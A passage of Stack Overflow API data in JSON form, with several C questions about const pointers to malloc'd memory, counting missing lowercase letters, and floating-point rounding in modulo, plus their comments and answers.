"close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 2, "accepted_answer_id": 48797501, "answer_count": 4, "score": 2, "last_activity_date": 1536923190, "creation_date": 1518647865, "last_edit_date": 1536903652, "question_id": 48797374, "link": "https://stackoverflow.com/questions/48797374/how-do-compilers-treat-const-qualifier-when-the-pointer-points-to-a-memory-locat", "title": "How do compilers treat CONST qualifier when the pointer points to a memory location obtained with malloc()?", "body": "<p>I really do not know how to put a better title so please be patient with me and have mercy.</p>\n\n<p><strong>What I know.</strong></p>\n\n<p>When I do something like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ( void ){\n    const char *arr = \"Hello\";\n\n    arr[0] = 'B';\n    printf( \"Arr = %s\\n\", arr );\n}\n</code></pre>\n\n<p>I won't get a <code>segfault</code> because applying that <code>const</code> qualifier I made a promise to the compiler that I am not going to touch that value where <code>arr</code> points to.</p>\n\n<p>At least on my system ( Linux mint 18.3 with GCC 7.2.0) I get:</p>\n\n<pre><code>program.c:6:16: error: assignment of read-only location \u2018*arr\u2019\n         arr[0] = 'B';\n                ^\n</code></pre>\n\n<p><strong>NEXT</strong></p>\n\n<p>When I do:</p>\n\n<pre><code>const char *const arr = \"Hello\";\n</code></pre>\n\n<p>Like in the following program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main ( void ){\n    const char *const arr = \"Hello\";\n\n    while ( *arr != '\\0' ){\n        arr++;\n    }\n    printf( \"Arr = %s\\n\", arr );\n}\n</code></pre>\n\n<p>The compiler also knows that I promise to not increment the pointer and it see it:</p>\n\n<pre><code>program.c:7:16: error: increment of read-only variable \u2018arr\u2019\n             arr++;\n                ^~\n</code></pre>\n\n<p><strong>What I do not Understand.</strong></p>\n\n<p>How exactly do compilers treat a situation like this one:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main ( void ){\n    const char *const arr = calloc( 256 * sizeof( *arr ), sizeof( *arr ) );\n\n    strcpy ( (char*)arr , \"Hello\" );\n    printf( \"Arr = %s\\n\", arr );\n\n    free ( (char*)arr );\n}\n</code></pre>\n\n<p>Here I am forced to cast <code>arr</code> when I call <code>strcpy()</code> and same for <code>free()</code>.<br>\nBut why the compiler does not see (ignores) the fact that even if I made a \"promise\" that I will not try to modify that variable it ignores the <code>const</code> qualifier?</p>\n\n<p>Moreover, when I do the following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main ( void ){\n    const char *const arr;\n\n    while ( *arr != '\\0' ){\n        arr++;\n    }\n\n    free ( (char*)arr );\n}\n</code></pre>\n\n<p>The compiler sees that I am trying to increment the pointer:</p>\n\n<pre><code>program.c:9:16: error: increment of read-only variable \u2018arr\u2019\n             arr++;\n                ^~\n</code></pre>\n\n<p>But ignores the fact that I made a promise that I will not modify the value.</p>\n\n<p>Does the fact that the <code>malloc</code> is involved here have a meaning somehow to the compiler that it needs to ignore all those <code>const</code> qualifiers`? ...<br>\nOr am I missing something important here?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1518648325, "post_id": 48797251, "comment_id": 84597505, "body": "You realize that <code>letters[ words[b] - &#39;a&#39; ]++</code> will increment some random memory location for any character that isn&#39;t a lowercase letter, right? Every space, newline, etc. All bets are off after that. But primarily, the value of b after the loop is just the length of the string words. Why would you expect it to contain a meaningful character?"}, {"owner": {"reputation": 27, "user_id": 8723169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85ab0fb0edfd9d17d2e46bf000696839?s=128&d=identicon&r=PG&f=1", "display_name": "RollTide1234", "link": "https://stackoverflow.com/users/8723169/rolltide1234"}, "reply_to_user": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1518650084, "post_id": 48797251, "comment_id": 84598179, "body": "@LeeDanielCrocker I see what you are talking about now, thanks"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1518652689, "post_id": 48797251, "comment_id": 84598888, "body": "it&#39;s also better to store <code>strlen(words)</code> in a variable instead of calculating it again and again in the loop. And never use magic numbers like 65 or 97, no one knows what they mean, and they may mean different things in another charset. Use <code>&#39;a&#39;</code> or <code>&#39;A&#39;</code>"}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 1, "creation_date": 1518655684, "post_id": 48797251, "comment_id": 84599710, "body": "Why are you reading words in each loop? By the way, <a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\"><code>while(!feof(stdin))</code> doesn&#39;t seem good</a> while it may not be completely wrong in this case."}, {"owner": {"reputation": 27, "user_id": 8723169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85ab0fb0edfd9d17d2e46bf000696839?s=128&d=identicon&r=PG&f=1", "display_name": "RollTide1234", "link": "https://stackoverflow.com/users/8723169/rolltide1234"}, "reply_to_user": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 0, "creation_date": 1518657529, "post_id": 48797251, "comment_id": 84600195, "body": "@MikeCAT yes I am aware that while(!feof(stdin)) doesn&#39;t work but I am supposed to use it as I have to end the string with control-d"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518677142, "post_id": 48797251, "comment_id": 84605267, "body": "The only time you need to use <code>feof()</code> is when you have already found that an I/O function has failed and you need to distinguish between an error (<code>ferror()</code> returns true) and EOF (<code>feof()</code> returns true).  Otherwise, you don&#39;t need <code>feof()</code>.  And if you type control-D at a terminal on a Unix system (under typical default settings), then that signals EOF by making <code>read()</code> return 0 bytes (unless there&#39;s some data already in the buffer, in which case that data is sent even before the enter key is pressed."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518677196, "post_id": 48797251, "comment_id": 84605287, "body": "Note that the initial <code>scanf(&quot;%s&quot;, words)</code> skips leading white space and then only reads a single word terminated by white space (newline, blank, etc)."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1518726117, "post_id": 48797251, "comment_id": 84635064, "body": "for ease of readability and understanding: consistently indent the code.  indent after EVERY opening brace &#39;{&#39;.  unindent before EVERY closing brace &#39;}&#39;.  Suggest each indent level be 4 spaces"}], "answers": [{"tags": [], "owner": {"reputation": 346, "user_id": 5428609, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/10153291007982901/picture?type=large", "display_name": "Luke Purnell", "link": "https://stackoverflow.com/users/5428609/luke-purnell"}, "is_accepted": true, "score": 0, "last_activity_date": 1518690410, "creation_date": 1518690410, "answer_id": 48804932, "question_id": 48797251, "link": "https://stackoverflow.com/questions/48797251/find-missing-lower-case-letters-that-are-not-in-a-series-of-words/48804932#48804932", "title": "Find missing lower-case letters that are not in a series of words", "body": "<p>Here is a working first implementation.</p>\n\n<p>As well as the comments that have already been made, you should use functions wherever possible to separate out the functionality of the program into logical steps. Your main function should then just call the appropriate functions in order to solve the problem. Each function should be something that is self contained and testable.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX_INPUT 20 /* Max input to read from user. */\n\nchar *readinput(void);\nvoid find_missing_lower_case(char *, int);\n\nint main()\n{\n    char *user_input = readinput();\n    int len_input = strlen(user_input);\n\n    printf(\"user input: %s\\n\", user_input);\n    printf(\"len input: %d\\n\", len_input);\n\n    find_missing_lower_case(user_input, len_input);\n\n    /* Free the memory allocated for 'user_input'. */\n    free(user_input);\n    return 0;\n}\n\nchar *readinput()\n{\n    char a;\n    char *result = (char *) malloc(MAX_INPUT);\n\n    int i;\n    for(i = 0; i &lt; MAX_INPUT; ++i)\n    {\n        scanf(\"%c\", &amp;a);\n        if( a == '\\n')\n        {\n            break;\n        }\n        *(result + i) = a;\n    }\n\n    *(result + i) = '\\0';\n    return result;\n}\n\nvoid find_missing_lower_case(char *input, int len_input)\n{\n    int a = 97;        /* ASCII value of 'a' */\n    int z = 122;       /* ASCII value of 'z' */\n\n    int lower_case_chars[26] = {0};  /* Initialise all to value of 0 */\n\n    /* Scan through input and if a lower case char is found, set the\n     * corresponding index of lower_case_chars to 1\n     */\n    for(int i = 0; i &lt; len_input; i++)\n    {\n        char c = *(input + i);\n        if(c &gt;= a &amp;&amp; c &lt;= z)\n        {\n            lower_case_chars[c - a] = 1;\n        }\n    }\n\n    /* Iterate through lower_case_chars and print any values that were not set\n     * to 1 in the above for loop.\n     */\n    printf(\"Missing lower case characters:\\n\");\n    for(int i = 0; i &lt; 26; i++)\n    {\n        if(!lower_case_chars[i])\n        {\n            printf(\"%c \", i + a);\n        }\n    }\n    printf(\"\\n\");\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 27, "user_id": 8723169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85ab0fb0edfd9d17d2e46bf000696839?s=128&d=identicon&r=PG&f=1", "display_name": "RollTide1234", "link": "https://stackoverflow.com/users/8723169/rolltide1234"}, "is_accepted": false, "score": 0, "last_activity_date": 1520134918, "creation_date": 1520134918, "answer_id": 49091746, "question_id": 48797251, "link": "https://stackoverflow.com/questions/48797251/find-missing-lower-case-letters-that-are-not-in-a-series-of-words/49091746#49091746", "title": "Find missing lower-case letters that are not in a series of words", "body": "<p>I figured it out and this is the code I used.</p>\n\n<pre><code>int main(void)\n{\nint array[26];\nchar w;\nint i=0;\n\nfor(i=0; i&lt;26; i++) {\narray[i]=0; }\nprintf(\"Enter your input: \");\nscanf(\"%c\", &amp;w); \nwhile(!feof(stdin)) {\n    array[w-97] = 1; \nscanf(\"%c\", &amp;w); }\n\nprintf(\"Missing letters: \");\n\nfor(i=0; i&lt;26; i++) {\n    if(array[i] == 0) {\n        printf(\"%c \", i+97); }\n        }\nprintf(\"\\n\");\n\nreturn 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 8723169, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85ab0fb0edfd9d17d2e46bf000696839?s=128&d=identicon&r=PG&f=1", "display_name": "RollTide1234", "link": "https://stackoverflow.com/users/8723169/rolltide1234"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 48804932, "answer_count": 2, "score": 0, "last_activity_date": 1520134918, "creation_date": 1518647153, "question_id": 48797251, "link": "https://stackoverflow.com/questions/48797251/find-missing-lower-case-letters-that-are-not-in-a-series-of-words", "title": "Find missing lower-case letters that are not in a series of words", "body": "<p>As stated in the title I am trying to find all lower-case letters that are <strong>not</strong> in a series of words. There are no upper-case letters, digits, punctuation, or special symbols.</p>\n\n<p>I need help fixing my code. I am stuck and do not know where to go from here.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void){\nint letters[26];\nchar words[50];\nint i = 0, b = 0;\n\nprintf(\"Enter your input : \");\nscanf(\"%s\", words);\n\nfor(i = 0; i &lt; 26; i++){\n  letters[i] = 0;\n}\n\nwhile(!feof(stdin)){\n\n  for(b = 0; b &lt; strlen(words) - 1; b++){\n    letters[ words[b] - 'a']++;\n    scanf(\"%s\", words);\n  }\n}\n\n  printf(\"\\nMissing letters : %c \", b + 97);\n\n\n  return 0;\n}\n</code></pre>\n\n<p>My output is giving me some random letter that I do not know where it is coming from.</p>\n"}, {"tags": ["c", "floating-point", "modulo"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 2, "creation_date": 1518646989, "post_id": 48797203, "comment_id": 84596918, "body": "Rounding errors probably. Is d*100 4912.00000000000001 or 4911.999999999999999?. It&#39;s not the modulo either, it&#39;s the (int)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518647057, "post_id": 48797203, "comment_id": 84596948, "body": "Try <code>printf(&quot;%.20g\\n&quot;, 49.12);</code>.  What is your result?  IS it &quot;49.119999999999997442&quot;?"}, {"owner": {"reputation": 13, "user_id": 9362333, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-irWF5b_0muM/AAAAAAAAAAI/AAAAAAAAVPo/igg-dZJF-1w/photo.jpg?sz=128", "display_name": "XSized", "link": "https://stackoverflow.com/users/9362333/xsized"}, "edited": false, "score": 0, "creation_date": 1518647176, "post_id": 48797203, "comment_id": 84596999, "body": "Tried, that&#39;s 49.119999999999997"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518647389, "post_id": 48797203, "comment_id": 84597108, "body": "Isn&#39;t it answering your question?"}, {"owner": {"reputation": 13, "user_id": 9362333, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-irWF5b_0muM/AAAAAAAAAAI/AAAAAAAAVPo/igg-dZJF-1w/photo.jpg?sz=128", "display_name": "XSized", "link": "https://stackoverflow.com/users/9362333/xsized"}, "edited": false, "score": 0, "creation_date": 1518647538, "post_id": 48797203, "comment_id": 84597179, "body": "I think so, but I don&#39;t understand, why I see this rounding error in only one case. :/"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518647771, "post_id": 48797203, "comment_id": 84597269, "body": "@XSized For <code>double</code> of the form <code>xx.yy</code>, about half of them will encode a <code>double</code> a bit above the mathematical <code>xx.yy</code> and about half below.  The <code>(int)</code> in <code>(int)(d*100)%100</code> call will split those groups to <code>yy</code> and <code>yy-1</code>  camps."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518649017, "post_id": 48797203, "comment_id": 84597763, "body": "Is there a reason not to close this as a duplicate of <a href=\"https://stackoverflow.com/questions/588004/is-floating-point-math-broken\">Is floating point math broken?</a>?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1518649172, "post_id": 48797203, "comment_id": 84597820, "body": "@XSized: The C standard allows a C implementation to use extended precision in intermediate calculations. So <code>(int) d*100</code> may apply <code>int</code> to a value that is very very near, but less than, 4912. When a value is assigned to an object, the rules require it be converted to the target precision. So <code>d = d * 100;</code> would round that value to the nearest <code>double</code>, which is apparently 4912."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1518649422, "post_id": 48797203, "comment_id": 84597911, "body": "@JonathanLeffler: Yes. The answers in that question explain little and do not well address specific issues that people ask about. Promiscuously closing questions as duplicates of that one deters people from learning about floating point and precludes building up a repository of matched floating-point questions and answers. It is like answering every C question where somebody is tripped up by sequence points, integer promotion, <i>etc.</i> as a duplicate of \u201cIs C broken?\u201d"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 9362333, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-irWF5b_0muM/AAAAAAAAAAI/AAAAAAAAVPo/igg-dZJF-1w/photo.jpg?sz=128", "display_name": "XSized", "link": "https://stackoverflow.com/users/9362333/xsized"}, "edited": false, "score": 0, "creation_date": 1518647806, "post_id": 48797324, "comment_id": 84597286, "body": "Perfect! Thanks, now I understand the problem!"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1518648211, "post_id": 48797324, "comment_id": 84597458, "body": "There is more going in here. This answer only gives a possible reason <code>(int) (d*100) % 100</code> evaluates to 11. It does not explain why, after <code>d = d*100;</code>, <code>(int) d % 100</code> evaluates to 12. OP may be using an implementation that uses extended precision in intermediate calculations."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 13, "user_id": 9362333, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-irWF5b_0muM/AAAAAAAAAAI/AAAAAAAAVPo/igg-dZJF-1w/photo.jpg?sz=128", "display_name": "XSized", "link": "https://stackoverflow.com/users/9362333/xsized"}, "edited": false, "score": 1, "creation_date": 1518648290, "post_id": 48797324, "comment_id": 84597485, "body": "@XSized Note that your <code>printf(&quot;%.20g\\n&quot;, 49.12);</code> reported 49.119999999999997 and mine reported 49.119999999999997442.  That is certainly due to the quality of the <code>printf()</code> function and not due to a difference of the <code>double</code> value code is using.  Some <code>printf()</code> better handle the lower digits better than others."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1518648602, "post_id": 48797324, "comment_id": 84597598, "body": "@EricPostpischil Yes, certainly far more going on.  Your suggestion about intermediate results may occur at higher precision is good - as usual.  Still focusing on OP&#39;s likely initial understanding needs before rambling about in the details about precision <code>FLT_EVAL_METHOD</code> and the rest."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 4, "last_activity_date": 1518647895, "last_edit_date": 1518647895, "creation_date": 1518647598, "answer_id": 48797324, "question_id": 48797203, "link": "https://stackoverflow.com/questions/48797203/confusing-modulo-in-c/48797324#48797324", "title": "Confusing modulo in c", "body": "<p><code>double</code> as a 64-bit floating point number cannot represent every number coded as text. In can encode exactly about 2<sup>64</sup> different numbers. <code>49.12</code> is not one of them.</p>\n\n<p>Given the <em>binary</em> nature of most <code>double</code>, the closest <code>double d</code> value is about <code>49.119999999999997</code>.</p>\n\n<p>The result of <code>(int)(d*100)%100</code> is then simply 11.</p>\n\n<hr>\n\n<p>On another platform,the result may have been 12.</p>\n"}], "owner": {"reputation": 13, "user_id": 9362333, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-irWF5b_0muM/AAAAAAAAAAI/AAAAAAAAVPo/igg-dZJF-1w/photo.jpg?sz=128", "display_name": "XSized", "link": "https://stackoverflow.com/users/9362333/xsized"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 48797324, "answer_count": 1, "score": 1, "last_activity_date": 1518649908, "creation_date": 1518646943, "last_edit_date": 1518649908, "question_id": 48797203, "link": "https://stackoverflow.com/questions/48797203/confusing-modulo-in-c", "title": "Confusing modulo in c", "body": "<p>I'm a bit confused with modulo in c. Trying the following examples:</p>\n\n<pre><code>double d = 4912;\nint a;\na = (int) d%100;\nprintf (\"%d \\n\", a);\n</code></pre>\n\n<p>Answer is 12. Fine, that's what I'm expecting. Now I try this:</p>\n\n<pre><code>double d = 49.12;\nd = d*100;\nint a;\na = (int) d%100;\nprintf (\"%d \\n\", a);\n</code></pre>\n\n<p>Answer: 12. Again what I'm expecting. But now:</p>\n\n<pre><code>double d = 49.12;\nint a;\na = (int)(d*100)%100;\nprintf (\"%d \\n\", a);\n</code></pre>\n\n<p>Answer: 11! That's definitly not what I expected. But I have no idea why. oO</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518646889, "post_id": 48797172, "comment_id": 84596875, "body": "I doubt most of C programmers know the meaning of &quot;proper&quot; and &quot;improper&quot; times for percentages of the speed of light."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1518646964, "post_id": 48797172, "comment_id": 84596907, "body": "StackOverflow expects you to <a href=\"http://meta.stackoverflow.com/questions/261592\">try to solve your own problem first</a>, and we also <a href=\"https://softwareengineering.meta.stackexchange.com/questions/6166\">don&#39;t answer homework questions</a> (ignore if you&#39;re not asking about hw). Please update your question to show what you have already tried in a <a href=\"http://stackoverflow.com/help/mcve\">minimal, complete, and verifiable example</a>. For further information, please see <a href=\"http://stackoverflow.com/help/how-to-ask\">how to ask good questions</a>, and take the <a href=\"http://stackoverflow.com/tour\">tour of the site</a> :)"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518647105, "post_id": 48797172, "comment_id": 84596967, "body": "@EugeneSh. You don&#39;t need to understand those concepts, he&#39;s just asking how to generate that numeric sequence. Increment a digit by 3 until it gets to 9, then repeat with the next digit."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518647140, "post_id": 48797172, "comment_id": 84596983, "body": "Then these concepts should be removed from the question."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1518647227, "post_id": 48797172, "comment_id": 84597027, "body": "Use nested <code>for</code> loops. The outer loop specifies the multiplier of the increment, the inner loop goes from 0 to 3."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518647272, "post_id": 48797172, "comment_id": 84597050, "body": "@EugeneSh. Come on, there&#39;s nothing wrong with including the motivation of the problem."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1518647341, "post_id": 48797172, "comment_id": 84597078, "body": "@Barmar Not when it is obfuscating the real problem up to a point &quot;nah, I have no idea what he is talking about&quot;. Anyway, to the question. I have a strong feeling that it can be done with single loop and <code>log</code>...."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1518647475, "post_id": 48797172, "comment_id": 84597150, "body": "I&#39;ve edited it for the benefit of people who can&#39;t understand &quot;I am trying to find a way to get that sequence&quot; as being the gist of the question."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518648282, "post_id": 48797172, "comment_id": 84597481, "body": "Check this out: <a href=\"https://ideone.com/HZuFX0\" rel=\"nofollow noreferrer\">ideone.com/HZuFX0</a> I came up with this, but have a little idea why it is working :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 